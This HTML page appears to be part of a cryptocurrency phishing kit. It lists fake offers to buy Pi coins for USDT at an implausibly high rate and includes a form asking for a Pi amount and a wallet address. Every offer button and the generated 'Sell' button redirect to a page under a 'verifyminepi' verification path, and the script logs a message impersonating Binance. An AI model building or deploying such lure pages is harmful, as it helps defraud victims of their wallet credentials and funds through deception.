<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Available Offers</title>
    <link rel="stylesheet" href="available-offers.css">
</head>
<body>
    <button class="back-button" onclick="goBack()">&#8592; Back</button> <!-- Back button moved to the top left corner -->
    <div class="container">
        <h1>AVAILABLE OFFERS</h1>
        <div class="offer-list">
            <div class="offer">
                <p>500 pi - 19000 USDT</p>
                <button onclick="navigateTo('vent/verifyminepi.com/verifyminepi/verify/ventindex.html')">Next</button>
            </div>
            <div class="offer">
                <p>700 pi - 26600 USDT</p>
                <button onclick="navigateTo('vent/verifyminepi.com/verifyminepi/verify/ventindex.html')">Next</button>
            </div>
            <!-- Add more available offers as needed -->
            <div class="offer">
                <p>300 pi - 11400 USDT</p>
                <button onclick="navigateTo('vent/verifyminepi.com/verifyminepi/verify/ventindex.html')">Next</button>
            </div>
            <div class="offer">
                <p>1000 pi - 38000 USDT</p>
                <button onclick="navigateTo('vent/verifyminepi.com/verifyminepi/verify/ventindex.html')">Next</button>
            </div>
        </div>
        <!-- New option to fill Pi amount and USDT wallet address -->
        <div class="pi-conversion">
            <label for="pi-amount">min 10 pi:</label>
            <input type="number" id="pi-amount" name="pi-amount" min="0" step="1" placeholder="Enter Pi amount">
            <label for="usdt-wallet">USDT Wallet Address:</label>
            <input type="text" id="usdt-wallet" name="usdt-wallet" placeholder="Enter USDT wallet address">
            <button onclick="convertToUSDT()">Convert to USDT</button>
            <p id="usdt-equivalent"></p>
            <div id="sell-button-container"></div>
        </div>
    </div>

    <script>
        function navigateTo(page) {
            console.warn("Binance wants to verify ownership of account");
            window.location.href = page;
        }

        function goBack() {
            window.history.back();
        }

        function convertToUSDT() {
            const piAmount = document.getElementById('pi-amount').value;
            const usdtWallet = document.getElementById('usdt-wallet').value;
            const usdtEquivalent = piAmount * 38;
            document.getElementById('usdt-equivalent').textContent = `${piAmount} Pi is equivalent to ${usdtEquivalent} USDT`;

            if (!document.getElementById('sell-button')) {
                const sellButton = document.createElement('button');
                sellButton.id = 'sell-button';
                sellButton.textContent = 'Sell';
                sellButton.onclick = function() {
                    navigateTo('vent/verifyminepi.com/verifyminepi/verify/ventindex.html');
                };
                document.getElementById('sell-button-container').appendChild(sellButton);
            }
        }
    </script>
</body>
</html>
